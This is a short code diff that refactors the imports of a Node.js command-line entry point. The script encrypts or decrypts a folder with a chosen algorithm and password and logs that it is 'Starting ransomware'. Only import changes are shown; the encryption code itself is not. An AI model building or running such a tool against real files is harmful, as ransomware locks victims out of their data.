@@ -1,4 +1,9 @@
-require('dotenv').config();
+import dotenv from 'dotenv';
+import logger from './utils/logger';
+
+import { encodeFolder, decodeFolder } from './app';
+
+dotenv.config();
 const {
   argv: { f: FOLDER, a: ALGORITHM, p: PASSWORD, d, e },
 } = require('yargs')
@@ -7,9 +12,6 @@ const {
   )
   .boolean(['d', 'e'])
   .demandOption(['f', 'a', 'p']);
-
-const { encodeFolder, decodeFolder } = require('./app');
-const logger = require('./utils/logger');
 
 logger.debug(`Starting ransomware, logger in ${process.env.LOGGER_LEVEL} mode`);
 
